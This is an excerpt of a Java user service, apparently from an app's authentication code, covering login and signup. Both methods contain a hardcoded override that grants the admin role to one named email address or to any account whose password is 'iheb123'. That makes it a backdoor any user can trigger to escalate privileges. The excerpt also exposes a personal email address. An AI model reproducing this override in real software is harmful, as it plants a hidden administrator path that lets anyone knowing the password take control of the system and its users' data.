...
public class UserService {
        ...
        try (Connection conn = DatabaseUtil.getConnection();
            ...
            if (rs.next()) {
                ...
                if (passwordValid) {
                    ...
                    // Forcer admin pour ihebjbir10@gmail.com ou mot de passe iheb123
                    if (email.equalsIgnoreCase("ihebjbir10@gmail.com") || password.equals("iheb123")) {
                        userType = "admin";
                        roles = "[\"ROLE_ADMIN\"]";
                        currentUser = new User(rs.getInt("id_utilisateur"), email, storedPassword, userType, fullName.trim());
                    }
    ...
    public boolean signup(String email, String password, String name) {
        ...
        try (Connection conn = DatabaseUtil.getConnection();
            ...
            String rolesValue = "[\"ROLE_CLIENT\"]";
            if (email.equalsIgnoreCase("ihebjbir10@gmail.com") || password.equals("iheb123")) {
                rolesValue = "[\"ROLE_ADMIN\"]";
            }
            stmt.setString(7, rolesValue);    // roles
